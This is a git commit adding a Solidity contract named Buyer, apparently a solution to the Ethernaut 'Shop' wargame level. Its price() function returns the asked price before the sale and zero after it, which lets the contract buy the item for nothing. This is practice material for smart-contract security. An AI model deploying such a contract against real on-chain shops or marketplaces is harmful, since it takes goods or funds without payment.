f818876e3fed5ecf29423ee7ec4692985dc67255
Crys <mariano.christopher123@gmail.com>
2022-11-10 23:31:08 +0800

    updated shop attack

--- contracts/AttackShop.sol
+++ contracts/AttackShop.sol
@@ -1,4 +1,27 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-contract Buyer {}
+interface IShop {
+    function buy() external;
+
+    function isSold() external view returns (bool);
+
+    function price() external view returns (uint256);
+}
+
+contract Buyer {
+    function price() external view returns (uint256) {
+        bool isSold = IShop(msg.sender).isSold();
+        uint256 askedPrice = IShop(msg.sender).price();
+
+        if (!isSold) {
+            return askedPrice;
+        }
+
+        return 0;
+    }
+
+    function buyFromShop(address _shopAddr) public {
+        IShop(_shopAddr).buy();
+    }
+}
